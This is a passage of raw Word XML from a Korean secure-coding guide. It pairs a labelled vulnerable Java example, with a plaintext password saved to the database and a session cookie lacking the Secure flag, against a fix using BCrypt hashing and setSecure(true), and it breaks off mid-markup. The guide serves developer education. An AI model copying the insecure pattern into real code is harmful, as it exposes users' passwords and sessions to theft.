              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요정보를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>평문으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">user.setPassword(plainPassword);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>평문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>userDao.save(user);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] Secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>속성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>쿠키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cookie cookie = new Cookie("sessionId", sessionId);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// Secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>속성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTP</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에서도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송됨</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>평문으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SQL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인젝션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>번으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고객</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>즉시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. Secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>속성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구간에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패킷</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스니핑으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(Session Hijacking)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] BCrypt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String hashed = BCrypt.hashpw(plainPassword, BCrypt.gensalt());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>user.setPassword(hashed);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>userDao.save(user);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] Secure, HttpOnly </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>속성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cookie cookie = new Cookie("sessionId", sessionId);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cookie.setSecure(true);    // HTTPS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>에서만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>전송</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
